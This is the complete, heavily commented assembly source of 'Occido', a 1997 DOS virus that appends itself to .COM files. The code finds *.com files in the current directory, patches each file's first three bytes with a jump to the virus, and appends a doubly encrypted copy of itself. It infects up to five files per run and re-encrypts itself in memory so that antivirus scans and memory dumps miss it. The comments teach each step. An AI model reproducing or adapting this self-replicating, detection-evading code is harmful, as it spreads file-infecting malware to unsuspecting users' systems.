; NAME: Occido.com       ( 'Occido' = Several unfriendly meanings in Latin )
; TYPE: Appending
; ENCRYPTION: Yes ( Double )
; INFECTS: COM
; RESIDENT: No
; STEALTH: No
; DT: No                                     ( Directory Transversal )
; REPAIRABLE: Yes
; PAYLOAD: No
; SIZE: 328 bytes
; AUTHOR: The Virus Elf

; Appends itself to files while encrypting itself with two different
; encryption routines. Only infects 5 files per run of an infected file.
; After infecting 5 files, or all in current directory, it will hide itself
; before closing. I just felt like doing it for more fun. If a person were
; to pause a running program and do a mem dump, the virus would not show up
; because it hides itself before returning control to the running progge.

start:
jmp  Virus_start         ; Jumps to the start of the virus. This
                         ; will change as the virus is appended to
                         ; different size files.
Virus_start:
call Delta               ; Now we have to get the delta offset. By
                         ; calling Delta we push the address of 'pop bp'
                         ; onto the stack.
Delta:
pop  bp                  ; Put the address into BP so it can be used.
sub  bp,offset delta     ; Now this takes the distance that Delta is now
                         ; now (BP) and subtracts where it started
                         ; (Offset Delta). Understand?? Hopefully you do!
                         ; Because most files are different sizes, and this
                         ; virus just attaches itself to the end we have
                         ; to find out where it is before it can do anything.

Skip:
jmp  DHidden             ; We have to skip the decrypt part on the first run

Decrypt:
                         ; Give length of area to decrypt to CX
;mov cx,cryptie-hidden   ; This is written later to keep correct file size
                         ; and offsets. It overwrites the 'jmp hidden'.
lea  di,[bp+hidden]      ; Start of area to decrypt
mov  si,di               ; its also the destination for decrypted part
call Cryptie             ; Decrypts the virus from here to the decryption
                         ; routine.

Hidden:                  ; Only encrypted once, because this is the decrypt
                         ; call for the second layer.
lea  di,[bp+Dhidden]     ; Puts the starting address of the secong layer of
                         ; encryption into DI
mov  si,di               ; Then SI
mov  cx,DCryptie-Dhidden ; Gets the size for the next area to decrypt
mov  dl,03h              ; Decryption code value
call DCryptie            ; Boom! Decrypts the second layer

DHidden:                 ; Area that is hidden with Double encryption

; Here we will write the saved bytes from the beggining of the file, back
; to where they belong, so that we may run the file as normal, after we
; infect some more files of course :)

lea  si,[bp+saved]       ; Notice the [bp+saved]. It accesses a memory locale
                         ; that would be changed depending on infected file
                         ; size. We just add our Delta offset to find out
                         ; its exact location.
lea  di,100h             ; We are gonna write the saved bytes to the start
                         ; so we run the program as normal after we infect
                         ; some files.
mov  cx,03h              ; The number of bytes we have to write back to start
rep  movsb               ; Quickly restores the file so we can run it after
                         ; we get through here.

lea  si,[bp+frstbytes]   ; We have to save these over the jmp
                         ; so that later we can just copy Virus to mem
lea  di,[bp+Skip]        ; Where the skip instruction is
                         ; We are gonna over write it with the Frstbytes
mov  cx,03h              ; Length of area 
rep  movsb               ; Does the job

push 00h                 ; Pushes the 0 value to stack, this will keep
                         ; a count of the files infected during each run.

mov  ax,4E00h            ; Function 4Eh: Find First
Findnext:                ; Findnext jmp point
lea  dx,[bp+filemask]    ; Gets the filemask = '*.com',0
xor  cx,cx               ; No attributues in this search
int  21h                 ; Tells DOS to find the *.com files

jnc  Open                ; Found one, now open it!

jmp  Badstuff            ; NONE left, do some other stuff

Open:          ; Open/Encrypt/Infect routines

mov  ax,3D02h       ; Function 3D: Open File
                    ; 02 = Read/Write access
mov  dx,9Eh         ; Location of ASCIZ filename
int  21h            ; Calls DOS to open the file, with Read/Write access
                    ; so that we can write the virus to it :)

xchg bx,ax          ; Gives the file handle from AX to BX in one byte.

mov  ah,3Fh         ; Function 3Fh: Read from file
mov  cx,03h         ; We are gonna read the first 3 bytes. CX = # of bytes
                    ; to read from file.
lea  dx,[bp+saved]  ; The location for the bytes to be stored when read.
int  21h            ; Calls DOS to load the first 3 bytes of Victem file
                    ; into the 'Saved' location so that it may run correctly.

mov  al,0E9h        ; Checks to see if it was a jump instruction
cmp  al,[bp+saved]  ; by matching E9h to the first byte of the file.
jne  Uninfected     ; It can't be infected by this virus because the file
                    ; has NO jmp at its beggining. If it does have a jmp
                    ; but not from this program it could be from another
                    ; virus, and double infecting can cause trouble.
jmp  Infected

Uninfected:

mov  ax,[80h+1Ah]   ; Gets the filesize of the target file
sub  ax,03h         ; Takes into account the length of the JMP instruction
mov  [bp+jumpto],ax ; Puts the location to jmp to as the
                    ; 2nd,3rd bytes of the buffer.


mov  ax,4200h       ; Function 42h: Move File Pointer
                    ; 00h = beggining, after the read the FP moves 3 bytes
xor  cx,cx          ; 0 = CX
xor  dx,dx          ; 0 = DX
int  21h            ; Calls DOS, this is explained a bit more with the
                    ; next "Move File Pointer" instruction

mov  ah,40h         ; Function 40h: Write to file
mov  cx,03          ; Number of bytes to write. CX = # of bytes
lea  dx,[bp+jumping]; Start at buffer area, this will write the jump
                    ; instruction to the beggining of the victem file.
int  21h            ; Blammo! This is the jmp that skips over the normal
                    ; file and heads write to the virus code. INT 21h tells
                    ; DOS to write those three bytes.

mov  ax,4202h       ; Function 42h: Move File pointer
                    ; 02 = End of file ( EOF )
xor  cx,cx          ; DX:CX is the offset from the File pointer location,
xor  dx,dx          ; since we want to be exactly at the EOF we clear DX:CX
int  21h            ; Calls DOS to move the file pointer

; Write the Virus to memory

VirL EQU  Ende-Virus_Start

; Length of Virus except jmp at beggining

lea  si,[bp+Virus_Start] ; Start of virus
lea  di,[bp+buffer]      ; Area that it will be stored in mem
mov  cx,VirL             ; Length of it
rep  movsb

; Now we have to modify it so that it is encrypted  

DHiddenL  EQU  DCryptie-DHidden    ; Length of area to encrypt that will
                                   ; end up double encrypted.
HiddenL   EQU  Cryptie-Hidden      ; Length of single encrypt area
DHBufStart EQU  DHidden-Virus_Start+Buffer   ; Start of DHidden in buffer
HBufStart EQU  Hidden-Virus_Start+Buffer     ; Start of Hidden in Buffer

; More ways to clear up the clutter

; Here we encrypt All but the second and first Decrypt calls, and the
; decryption routines that go with em.

lea  si,[bp+DHBufStart]  ; Time to encrypt the first area that will then
mov  di,si               ; be encrypted again, giving us our Doubly Encrypted
                         ; area.
mov  cx,DHiddenL         ; Length of this area
mov  dl,05h              ; Encryption value
call DCryptie            ; Calls the Second Encryption routine
                         ; because this will become decrypted by the first
                         ; when infected files are run.

; Now we encrypt from Hidden to Cryptie ( while encrypting DHidden to
; DCryptie for the second time ) which makes this double encrypting.

lea  si,[bp+HBufStart]   ; Start of Hidden area in buffer
mov  di,si               ; You should know this one by now.
mov  cx,HiddenL          ; Length of the area
call Cryptie             ; Uhoh, now its encrypted and the AV software won't
                         ; find it. Now what are we gonna do?
                         ; ( Being sarcastic of course! )

; So we have the virus prepared for infecting :)

mov  ah,40h              ; Function 40h: Write to file ( everyone's fave )
lea  dx,[bp+buffer]      ; Start of virus in mem buffer
mov  cx,VirL             ; Length of it
int  21h                 ; Calls DOS to write this :)

pop  cx             ; This is gonna be the infected file count.
inc  cx             ; We must have found and infected one if we are here so
                    ; makes sure it gets added to the total.
push cx             ; Saves it so we can check again after the next file
                    ; is found.

Infected:           ; A place to jump in case the file is already infected

mov  ah,3Eh         ; Function 3Eh: Close File
int  21h            ; Calls DOS to close up the file.

pop  cx
push cx
cmp  cl,05h         ; Check to see if 5 files have been infected.
je   BadStuff
mov  ax,4F00h       ; Function 4Fh: Find next
jmp  Findnext

Badstuff:           ; Here is where the payload goes

exit:

; Now we are gonna get outta here, first we should cover up any stuff
; that might show up in a mem dump, so that if anyone looks, all they
; see is garbage.

lea  di,[bp+Virus_Start] ; Gets the location of the Virus_start and hides
                         ; everything but the encryption itself. ( and the
                         ; kitchen sink, of course )
mov  si,di               ; and put it into DI/SI so we can hide the virus
                         ; from the host program.
mov  cx,cryptie-Virus_start ; Gives length of area to hide into CX
call cryptie             ; Calls the encryption loop to hide it

                         ; Jumps to the start of the actual program.
;push 100h               ; This is encrypted because the call to cryptie
;ret                     ; will decrypt it and it will be the only thing
db   87h,0EFh,0EEh,2Ch   ; unencrypted ( along with the cryptie loop, but
                         ; they are not very easily recognizable as virus
                         ; code. )

Frstbytes:
mov  cx,Cryptie - Hidden      ; These will overwrite the jmp that skips the
                              ; decrypt routines on the first run.
saved     db   0CDh,020h,0h   ; This is the storage space for the first
                              ; three bytes from the infected file. CD20 is
                              ; the 'int 20h' instruction used to exit.
jumping   db   0E9h           ; E9 = jmp
jumpto    db   0,0            ; Place for the new address
filemask  db   '*.com',0      ; The type of files we are gonna infect.
message   db   'Occido/The_Virus_Elf/10.08.97' ; Virus Info

DCryptie:

lodsb                    ; Gets next byte Doomed for De/Encryption
xchg dx,cx               ; Saves the count while using the DE/ENcrypt value
                         ; Uses 3 to decrypt and 5 to encrypt
rol  al,cl               ; Rotates those bits by CL
not  al                  ; Opposite bits
neg  al                  ; One's complement bits
not  al                  ; More opposite bits
xor  al,0C4h             ; XORs the value
not  al                  ; See above
neg  al                  ; " "
not  al                  ; " "
rol  al,cl               ; " "
xchg cx,dx               ; Returns the count value to CX
stosb                    ; Puts the encrypted byte into mem
loop DCryptie            ; Does all the bytes specified by CX
ret                      ; Jumps back to the caller

Cryptie:

lodsb                    ; Gets the next byte to De/Encrypt
ror  al,04h              ; Rotates the bits 4 places
xor  al,0C4h             ; Does a little XORing
not  al                  ; Gets the opposite bits
neg  al                  ; Gets the one's complement bits
not  al                  ; Gets the opposite bis again
xor  al,0C4h             ; More XORing
ror  al,04h              ; Rotates the bits Back 4 places
stosb                    ; Plugs AL back into mem
loop Cryptie             ; Does all the bytes specified by CX
ret                      ; Jumps back to where it was called

buffer:
ende:
